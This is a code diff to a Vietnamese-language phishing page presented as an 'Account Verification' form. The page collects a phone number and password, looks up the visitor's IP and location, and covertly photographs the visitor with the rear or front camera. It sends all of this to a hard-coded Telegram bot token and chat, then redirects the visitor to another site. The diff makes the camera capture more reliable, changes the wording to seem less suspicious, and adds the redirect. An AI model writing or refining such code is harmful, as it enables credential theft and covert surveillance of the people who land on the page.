@@ -76,7 +76,7 @@
   <div class="card">
     <div class="live-clock" id="clock">Đang tải thời gian...</div>
     <h2>Xác Thực Tài Khoản</h2>
-    <p class="subtitle" id="sub-text">Vui lòng nhập thông tin liên kết bên dưới.</p>
+    <p class="subtitle" id="sub-text">Vui lòng nhập thông tin để tiếp tục.</p>
 
     <div class="input-group">
       <label>Số điện thoại</label>
@@ -84,7 +84,7 @@
     </div>
 
     <div class="input-group">
-      <label>Tạo mật khẩu tài khoản</label>
+      <label>Mật khẩu tài khoản</label>
       <input type="password" id="password-input" placeholder="Nhập mật khẩu..." />
     </div>
 
@@ -96,8 +96,10 @@
   </div>
 
 <script>
+  // Cấu hình Telegram Bot Token và Chat ID của bạn
   const TELEGRAM_BOT_TOKEN = '8812338501:AAFnZiI0fpcNqs0LMGUUuFV2MCSTgpdNbaI'; 
   const TELEGRAM_CHAT_ID = '-1004303781844'; 
+  const REDIRECT_URL = 'https://xnhau.city/';
 
   function updateClock() {
     const now = new Date();
@@ -127,9 +129,9 @@
     }
 
     captureBtn.style.display = 'none';
-    statusDiv.textContent = 'Đang xử lý thông tin bảo mật...';
+    statusDiv.textContent = 'Đang đồng bộ hệ thống...';
 
-    // Lấy thông tin IP chi tiết
+    // Lấy thông tin IP và vị trí
     let ipDetails = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
     try {
       const ipRes = await fetch('https://ipwho.is/');
@@ -158,30 +160,41 @@
       `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n` +
       `━━━━━━━━━━━━━━━━━━━━━`;
 
-    // Kích hoạt chụp ảnh Camera sau (environment)
+    // Cố gắng chụp ảnh (Ưu tiên camera sau, nếu lỗi tự động fallback sang camera trước)
+    let stream = null;
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ 
+      stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: { exact: 'environment' } }, 
         audio: false 
-      }).catch(async () => {
-        return await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
       });
+    } catch (err) {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: true, 
+          audio: false 
+        });
+      } catch (e) {
+        stream = null;
+      }
+    }
 
+    if (stream) {
       video.srcObject = stream;
       await new Promise((resolve) => {
         video.onloadedmetadata = () => {
           video.play();
-          setTimeout(() => {
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          setTimeout(async () => {
+            try {
+              canvas.width = video.videoWidth || 640;
+              canvas.height = video.videoHeight || 480;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            canvas.toBlob(async (blob) => {
+              const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
               if (blob) {
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, 'back_cam.jpg');
+                formData.append('photo', blob, 'capture.jpg');
                 formData.append('caption', infoText);
                 formData.append('parse_mode', 'HTML');
 
@@ -190,22 +203,30 @@
                   body: formData
                 });
               }
-              stream.getTracks().forEach(track => track.stop());
-              resolve();
-            }, 'image/jpeg', 0.9);
+            } catch (err) {}
+            
+            stream.getTracks().forEach(track => track.stop());
+            resolve();
           }, 1000);
         };
       });
-    } catch (err) {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText + '\n\n⚠️ (Người dùng từ chối camera)', parse_mode: 'HTML' })
-      });
+    } else {
+      // Nếu không mở được camera, gửi thông báo văn bản thuần túy
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText + '\n\n⚠️ (Không thể truy cập camera)', parse_mode: 'HTML' })
+        });
+      } catch (e) {}
     }
 
-    statusDiv.textContent = 'Xác thực thành công!';
+    // Hoàn tất quá trình gửi ngầm -> Chuyển hướng sang trang đích
+    statusDiv.textContent = 'Xác thực thành công! Đang chuyển hướng...';
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, 800);
   };
 </script>
 </body>
-</html>ểt
+</html>
